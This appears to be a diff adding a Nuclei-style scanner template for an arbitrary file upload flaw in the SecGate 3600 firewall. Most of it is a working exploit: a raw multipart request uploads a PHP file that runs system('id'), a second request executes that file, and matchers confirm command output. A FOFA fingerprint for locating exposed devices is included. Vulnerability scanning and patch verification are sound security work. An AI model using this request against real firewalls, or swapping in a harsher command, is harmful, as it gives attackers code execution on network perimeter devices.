@@ -1,0 +1,59 @@
+id: qianxin-secworld-secgate-3600-fileupload
+
+info:
+  name: qianxin-secworld-secgate-3600-fileupload
+  author: hufei
+  severity: critical
+  description: |
+    网神 SecGate 3600 防火墙 obj_app_upfile接口存在任意文件上传漏洞，攻击者通过构造特殊请求包即可获取服务器权限
+  reference:
+    https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/e48ba246197315d26acb2fda1ecad4cb420df633/docs/wiki/iot/%E5%A5%87%E5%AE%89%E4%BF%A1/%E7%BD%91%E7%A5%9E%20SecGate%203600%20%E9%98%B2%E7%81%AB%E5%A2%99%20obj_app_upfile%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    max-request: 2
+    fofa-query: fid="1Lh1LHi6yfkhiO83I59AYg=="
+    hunter-query:
+  tags: 2023,HVV,fileupload,SecGate-3600
+
+http:
+  - raw:
+      - |
+        POST /?g=obj_app_upfile HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Content-Length: 574
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
+        User-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)
+
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+        Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+        10000000
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+        Content-Disposition: form-data; name="upfile"; filename="test.php"
+        Content-Type: text/plain
+
+        <?php system("id");unlink(__FILE__);?>
+
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+        Content-Disposition: form-data; name="submit_post"
+
+        obj_app_upfile
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+        Content-Disposition: form-data; name="__hash__"
+
+        0b9d6b1ab7479ab69d9f71b05e0e9445
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc--
+
+      - |
+        GET /attachements/test.php HTTP/1.1
+        Host: {{Hostname}}
+
+
+    matchers:
+      - type: word
+        words:
+          - 'uid='
+          - 'gid='
+          - 'groups='
+        condition: and
